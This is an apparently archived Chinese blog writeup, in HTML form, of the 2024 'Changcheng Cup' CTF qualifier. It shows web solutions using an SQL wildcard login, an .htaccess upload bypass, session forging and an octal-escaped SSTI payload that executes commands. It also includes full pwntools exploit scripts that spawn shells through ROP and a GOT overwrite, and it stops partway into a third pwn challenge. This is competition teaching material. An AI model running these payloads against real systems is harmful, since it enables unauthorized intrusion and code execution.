@@ -1,0 +1,528 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024 年第四届&quot;长城杯&quot;网络安全大赛（初赛）Writeup | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="SQL %% + .htaccess + 数字 md5 爆破 + 原型链污染 + SSTI 八进制 + pwn 3 题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 年第四届&quot;长城杯&quot;网络安全大赛（初赛）Writeup">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B-Writeup/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="SQL %% + .htaccess + 数字 md5 爆破 + 原型链污染 + SSTI 八进制 + pwn 3 题。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="SQL 通配符登录 %%">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B-%E5%88%9D%E8%B5%9B-Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024 年第四届"长城杯"网络安全大赛（初赛）Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024 年第四届&quot;长城杯&quot;网络安全大赛（初赛）Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024 年第四届&quot;长城杯&quot;网络安全大赛（初赛）Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/204463.html">https://www.ctfiot.com/204463.html</a><br>ID: 204463</p>
+</blockquote>
+<p>Web</p>
+<p>SQLUP</p>
+<p>源代码有提示,所以直接%%登录</p>
+<p>username&#x3D;admin&amp;password&#x3D;%%</p>
+<p>然后进入后台可以找到一处文件上传的位置,这里没限制后缀,但是限制不能有p字符</p>
+<p>直接上传.htaccess绕过,将1.xxx解析为php</p>
+<p>然后直接上传木马 然后tac有sudo权限,直接读flag就好了</p>
+<p>CandyShop</p>
+<p>给了源码,直接审计一下</p>
+<p>import datetime<br>from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response<br>from wtforms import StringField, PasswordField, SubmitField<br>from wtforms.validators import DataRequired, Length<br>from flask_wtf import FlaskForm<br>import re</p>
+<p>app &#x3D; Flask(<strong>name</strong>)</p>
+<p>app.config[‘SECRET_KEY’] &#x3D; ‘xxxxxxx’</p>
+<p>class RegistrationForm(FlaskForm):<br>    username &#x3D; StringField(‘Username’, validators&#x3D;[DataRequired(), Length(min&#x3D;2, max&#x3D;20)])<br>    password &#x3D; PasswordField(‘Password’, validators&#x3D;[DataRequired(), Length(min&#x3D;6, max&#x3D;20)])<br>    submit &#x3D; SubmitField(‘Register’)<br>    <br>class LoginForm(FlaskForm):<br>    username &#x3D; StringField(‘Username’, validators&#x3D;[DataRequired(), Length(min&#x3D;2, max&#x3D;20)])<br>    password &#x3D; PasswordField(‘Password’, validators&#x3D;[DataRequired(), Length(min&#x3D;6, max&#x3D;20)])<br>    submit &#x3D; SubmitField(‘Login’)</p>
+<p>class Candy:<br>    def <strong>init</strong>(self, name, image):<br>        self.name &#x3D; name<br>        self.image &#x3D; image</p>
+<p>class User:<br>    def <strong>init</strong>(self, username, password):<br>        self.username &#x3D; username<br>        self.password &#x3D; password</p>
+<p>    def verify_password(self, username, password):<br>        return (self.username&#x3D;&#x3D;username) &amp; (self.password&#x3D;&#x3D;password)<br>class Admin:<br>    def <strong>init</strong>(self):<br>        self.username &#x3D; “”<br>        self.identity &#x3D; “”</p>
+<p>def sanitize_inventory_sold(value):<br>    return re.sub(r’[a-zA-Z_]’, ‘’, str(value))<br>def merge(src, dst):<br>    for k, v in src.items():<br>        if hasattr(dst, ‘<strong>getitem</strong>‘):<br>            if dst.get(k) and type(v) &#x3D;&#x3D; dict:<br>                merge(v, dst.get(k))<br>            else:<br>                dst[k] &#x3D; v<br>        elif hasattr(dst, k) and type(v) &#x3D;&#x3D; dict:<br>            merge(v, getattr(dst, k))<br>        else:<br>            setattr(dst, k, v)</p>
+<p>candies &#x3D; [Candy(name&#x3D;”Lollipop”, image&#x3D;”images&#x2F;candy1.jpg”),<br>    Candy(name&#x3D;”Chocolate Bar”, image&#x3D;”images&#x2F;candy2.jpg”),<br>    Candy(name&#x3D;”Gummy Bears”, image&#x3D;”images&#x2F;candy3.jpg”)<br>]<br>users &#x3D; []<br>admin_user &#x3D; []<br>@app.route(‘&#x2F;register’, methods&#x3D;[‘GET’, ‘POST’])<br>def register():<br>    form &#x3D; RegistrationForm()<br>    if form.validate_on_submit():<br>        user &#x3D; User(username&#x3D;form.username.data, password&#x3D;form.password.data)<br>        users.append(user)<br>        return redirect(url_for(‘login’))<br>    <br>    return render_template(‘register.html’, form&#x3D;form)</p>
+<p>@app.route(‘&#x2F;login’, methods&#x3D;[‘GET’, ‘POST’])<br>def login():<br>    form &#x3D; LoginForm()<br>    if form.validate_on_submit():<br>        for u in users:<br>            if u.verify_password(form.username.data, form.password.data):<br>                session[‘username’] &#x3D; form.username.data<br>                session[‘identity’] &#x3D; “guest”<br>                return redirect(url_for(‘home’))<br>    <br>    return render_template(‘login.html’, form&#x3D;form)</p>
+<p>inventory &#x3D; 500<br>sold &#x3D; 0<br>@app.route(‘&#x2F;home’, methods&#x3D;[‘GET’, ‘POST’])<br>def home():<br>    global inventory, sold<br>    message &#x3D; None<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)</p>
+<p>    if not username:<br>        return redirect(url_for(‘register’))<br>    <br>    if sold &gt;&#x3D; 10 and sold &lt; 500:<br>        sold &#x3D; 0<br>        inventory &#x3D; 500<br>        message &#x3D; “But you have bought too many candies!”<br>        return render_template(‘home.html’, inventory&#x3D;inventory, sold&#x3D;sold, message&#x3D;message, candies&#x3D;candies)</p>
+<p>    if request.method &#x3D;&#x3D; ‘POST’:<br>        action &#x3D; request.form.get(‘action’)<br>        if action &#x3D;&#x3D; “buy_candy”:<br>            if inventory &gt; 0:<br>                inventory -&#x3D; 3<br>                sold +&#x3D; 3<br>            if inventory &#x3D;&#x3D; 0:<br>                message &#x3D; “All candies are sold out!”<br>            if sold &gt;&#x3D; 500:<br>                with open(‘secret.txt’, ‘r’) as file:<br>                    message &#x3D; file.read()</p>
+<p>    return render_template(‘home.html’, inventory&#x3D;inventory, sold&#x3D;sold, message&#x3D;message, candies&#x3D;candies)</p>
+<p>@app.route(‘&#x2F;admin’, methods&#x3D;[‘GET’, ‘POST’])<br>def admin():<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    admin &#x3D; Admin()<br>    merge(session,admin)<br>    admin_user.append(admin)<br>    return render_template(‘admin.html’, view&#x3D;’index’)</p>
+<p>@app.route(‘&#x2F;admin&#x2F;view_candies’, methods&#x3D;[‘GET’, ‘POST’])<br>def view_candies():<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    return render_template(‘admin.html’, view&#x3D;’candies’, candies&#x3D;candies)</p>
+<p>@app.route(‘&#x2F;admin&#x2F;add_candy’, methods&#x3D;[‘GET’, ‘POST’])<br>def add_candy():<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    candy_name &#x3D; request.form.get(‘name’)<br>    candy_image &#x3D; request.form.get(‘image’)<br>    if candy_name and candy_image:<br>        new_candy &#x3D; Candy(name&#x3D;candy_name, image&#x3D;candy_image)<br>        candies.append(new_candy)<br>    return render_template(‘admin.html’, view&#x3D;’add_candy’)</p>
+<p>@app.route(‘&#x2F;admin&#x2F;view_inventory’, methods&#x3D;[‘GET’, ‘POST’])<br>def view_inventory():<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    inventory_value &#x3D; sanitize_inventory_sold(inventory)<br>    sold_value &#x3D; sanitize_inventory_sold(sold)<br>    return render_template_string(“商店库存:” + inventory_value + “已售出” + sold_value)</p>
+<p>@app.route(‘&#x2F;admin&#x2F;add_inventory’, methods&#x3D;[‘GET’, ‘POST’])<br>def add_inventory():<br>    global inventory<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    if request.form.get(‘add’):<br>        num &#x3D; request.form.get(‘add’)<br>        inventory +&#x3D; int(num)<br>    return render_template(‘admin.html’, view&#x3D;’add_inventory’)</p>
+<p>@app.route(‘&#x2F;‘)<br>def index():<br>    return render_template(‘index.html’)</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    app.run(debug&#x3D;False, host&#x3D;’0.0.0.0’, port&#x3D;1337)</p>
+<p>做完题总结一下几处比较关键的源码</p>
+<h1 id="获取flag大致路径的"><a href="#获取flag大致路径的" class="headerlink" title="获取flag大致路径的"></a>获取flag大致路径的</h1><p>if request.method &#x3D;&#x3D; ‘POST’:<br>        action &#x3D; request.form.get(‘action’)<br>        if action &#x3D;&#x3D; “buy_candy”:<br>            if inventory &gt; 0:<br>                inventory -&#x3D; 3<br>                sold +&#x3D; 3<br>            if inventory &#x3D;&#x3D; 0:<br>                message &#x3D; “All candies are sold out!”<br>            if sold &gt;&#x3D; 500:<br>                with open(‘secret.txt’, ‘r’) as file:<br>                    message &#x3D; file.read()</p>
+<h1 id="造成原型链污染处"><a href="#造成原型链污染处" class="headerlink" title="造成原型链污染处"></a>造成原型链污染处</h1><p>def merge(src, dst):<br>    for k, v in src.items():<br>        if hasattr(dst, ‘<strong>getitem</strong>‘):<br>            if dst.get(k) and type(v) &#x3D;&#x3D; dict:<br>                merge(v, dst.get(k))<br>            else:<br>                dst[k] &#x3D; v<br>        elif hasattr(dst, k) and type(v) &#x3D;&#x3D; dict:<br>            merge(v, getattr(dst, k))<br>        else:<br>            setattr(dst, k, v)<br>….<br>admin &#x3D; Admin()<br>merge(session,admin)<br>….</p>
+<h1 id="SSTI处"><a href="#SSTI处" class="headerlink" title="SSTI处"></a>SSTI处</h1><p>def view_inventory():<br>    username &#x3D; session.get(‘username’)<br>    identity &#x3D; session.get(‘identity’)<br>    if not username or identity !&#x3D; ‘admin’:<br>        return redirect(url_for(‘register’))<br>    inventory_value &#x3D; sanitize_inventory_sold(inventory)<br>    sold_value &#x3D; sanitize_inventory_sold(sold)<br>    return render_template_string(“商店库存:” + inventory_value + “已售出” + sold_value)</p>
+<h1 id="SSTI-Waf处"><a href="#SSTI-Waf处" class="headerlink" title="SSTI Waf处"></a>SSTI Waf处</h1><p>def sanitize_inventory_sold(value):<br>    return re.sub(r’[a-zA-Z_]’, ‘’, str(value))</p>
+<p>大致的思路就是,因为这里写的很死,超过10个sold就会重置,所以只能够想着说通过session伪造去获取secret.txt</p>
+<p>这里通过密钥爆破获取到key是a123456</p>
+<p>然后就可以来伪造session,通过伪造sold超过500获取一下secret.txt的内容</p>
+<p>然后可以看到&#x2F;admin&#x2F;view_inventory接口是有模板渲染的,就会造成SSTI漏洞,虽然这里限制了不允许字母</p>
+<p>但是我们可以参考<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/22159">https://ctftime.org/writeup/22159</a></p>
+<p>来源：SCTF-XCTF 2020 Jsonhub</p>
+<p>解题思路主要是bypass SSTI 字母限制</p>
+<p>然后再搜索其他师傅的wp：<a target="_blank" rel="noopener" href="https://igml.top/2020/07/06/2020-SCTF/">https://igml.top/2020/07/06/2020-SCTF/</a></p>
+<p>就可以锁定是通过八进制来绕过这里的限制,然后再通过flask unsign工具来伪造一下session</p>
+<p>开源地址：<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
+<p>flask-unsign –sign –cookie “{‘identity’: ‘admin’, ‘username’: ‘test3’,’<strong>init</strong>‘:{‘<strong>global<br>s</strong>‘:{‘sold’:<br>857,’inventory’:’{{‘’[‘\137\137\143\154\141\163\163\137\137’][‘\137\137\142\141\163\145\163\137\137’][0]<a href="">‘\137\137\163\165\142\143\154\141\163\163\145\163\137\137’</a>[133][‘\137\137\151\156\151\164\137\137’][‘\137\137\147\154\157\142\141\154\163\137\137’][‘\137\137\142\165\151\154\164\151\156\163\137\137’]<a href="'%5C137%5C137%5C151%5C155%5C160%5C157%5C162%5C164%5C137%5C137%5C050%5C042%5C157%5C163%5C042%5C051%5C056%5C160%5C157%5C160%5C145%5C156%5C050%5C042%5C167%5C150%5C157%5C141%5C155%5C151%5C042%5C051%5C056%5C162%5C145%5C141%5C144%5C050%5C051'">‘\145\166\141\154’</a>}}’}}}” –secret ‘a123456’</p>
+<p>简单执行以下whoami证明方法可行</p>
+<p>然后这里直接读上面获取的路径是读不到的</p>
+<p>得一层一层ls来看</p>
+<p>然后再拼接一下路径</p>
+<p>就可以直接读flag了</p>
+<p>Pwn</p>
+<p>FlowerShop</p>
+<p>可以通过溢出修改金钱</p>
+<p>分析chunk函数，只需要我们买两朵影星玫瑰和一朵卡布奇诺玫瑰便可以满足溢出条件</p>
+<p>程序提供了&#x2F;bin&#x2F;sh和system函数，直接溢出构造system(“&#x2F;bin&#x2F;sh”)</p>
+<p>exp:</p>
+<p>from pwn import *</p>
+<p>context.log_level &#x3D; “debug”<br>context.terminal &#x3D; [“wt.exe”,”wsl”]</p>
+<p>elf &#x3D; ELF(“.&#x2F;pwn”)<br>p &#x3D; elf.process()<br>#p &#x3D; remote(“8.147.131.74”, 24077)<br>def debug():<br>    pause()<br>    gdb.attach(p)<br>    sleep(2)</p>
+<p>payload_1 &#x3D; b”A” * (0x40 - 0xc) + b”pwn”  + b”x00” + p32(0xffffff)<br>p.recvuntil(b”:n”)<br>p.send(payload_1)</p>
+<p>p.sendlineafter(b”:n”,b”a”)<br>p.sendlineafter(b”:n”,b”a”)<br>p.sendlineafter(b”1&#x2F;0n”,b”1”)<br>p.sendlineafter(b”:n”,b”a”)<br>p.sendlineafter(b”1&#x2F;0n”,b”1”)<br>#debug()<br>p.sendlineafter(b”:n”,b”b”)<br>p.sendlineafter(b”1&#x2F;0n”,b”1”)<br>p.sendlineafter(b”:n”,b”c”)</p>
+<p>binsh &#x3D; 0x601840<br>system &#x3D; elf.plt[“system”]<br>pop_rdi &#x3D; 0x0000000000400f13<br># : pop rdi ; ret<br>ret &#x3D; 0x00000000004006f6<br>payload_1 &#x3D; b”A” * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)<br>p.sendlineafter(b”1&#x2F;0n”,payload_1)<br>p.interactive()</p>
+<p>consumption</p>
+<p>分析半天了cJSON_Parse源码后面发现和json数据结构差不多</p>
+<p>cJSON代码阅读（parse）部分 – 核桃的炼金工坊 (twistoy.cn)</p>
+<p>构造好发包数据结构后便可以进行交互了</p>
+<p>漏洞点：</p>
+<p>这个a3时main函数的v13变量</p>
+<p>能够输入的数据超大，而v13和s的栈空间相差0x500字节，所以我们可以通过覆盖v13而达到任意地址写，</p>
+<p>将printf_got表地址写入到heap[1]当中，这样show(heap[1])便可以泄露出printf的真实地址</p>
+<p>而printf_got和free_got是相邻的，所以通过edit将free修改成system，释放chunk0 便可以getshell</p>
+<p>from pwn import *<br>import json</p>
+<p>context.log_level &#x3D; ‘debug’<br>context.terminal &#x3D; [“wt.exe”,”wsl”]</p>
+<p>elf &#x3D; ELF(“.&#x2F;pwn”)<br>#p &#x3D; elf.process()<br>p &#x3D; remote(“8.147.134.27”,38474)<br>#libc &#x3D; ELF(“&#x2F;home&#x2F;kamome&#x2F;tools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.31-0ubuntu9.16_i386&#x2F;libc.so.6”)<br>libc &#x3D; ELF(“.&#x2F;libc.so.6”)<br>def debug():<br>    pause()<br>    gdb.attach(p)<br>    sleep(2)</p>
+<p>def add_heap(size,content):<br>    p.sendlineafter(b”5.exittn”,b’{“choice”:”1”,”idx”:0,”size”:”‘ + bytes(str(size),encoding&#x3D;”utf-8”) + b’”,”content”:”‘ + content + b’”}’)</p>
+<p>def free_heap(idx):<br>    p.sendlineafter(b”5.exittn”,’{“choice”:”2”,”idx”:’ + str(idx) + ‘,”size”:””,”content”:””}’)</p>
+<p>def show_heap(idx):<br>    p.sendlineafter(b”5.exittn”,’{“choice”:”3”,”idx”:’ + str(idx) + ‘,”size”:””,”content”:””}’)</p>
+<p>def edit_heap(idx,content):<br>    p.sendlineafter(b”5.exittn”,b’{“choice”:”4”,”idx”:1,”size”:””,”content”:”‘ + content + b’”}’)</p>
+<p>#debug()<br>#pause()</p>
+<p>heaplist &#x3D; 0x08051B10<br>add_heap(8,b”&#x2F;bin&#x2F;sh”)</p>
+<p>#free_got &#x3D; elf.got[“free”]<br>printf_got &#x3D; elf.got[“printf”]</p>
+<p>payload_1 &#x3D; b”A” * 0x4cc + p32(heaplist + 4)<br>add_heap(printf_got,payload_1)<br>#add_heap(0x8,”AAAA”)</p>
+<p>show_heap(1)<br>libc.address &#x3D; u32(p.recvuntil(b”xf7”)[-4:]) - libc.sym[“printf”]<br>log.success(“libc.address &#x3D; “ + hex(libc.address))</p>
+<p>system &#x3D; libc.sym[“system”]</p>
+<p>edit_heap(1,b”A” * 4 + p32(system))</p>
+<p>free_heap(0)<br>#debug()<br>p.interactive()</p>
+<p>Kylin_Heap</p>
+<p>漏洞点</p>
+<p>存在UAF</p>
+<p>思路：</p>
+<p>申请一个大堆块使其释放进入unsorted bin，利用打印功能泄露libc，然后利用uaf任意地址申请到malloc_hook，将其覆盖为one_gadget，getshell</p>
+<p>exp:</p>
+<p>from pwn import *</p>
+<p>context.log_level &#x3D; “debug”<br>context.terminal &#x3D; [“wt.exe”,”wsl”]</p>
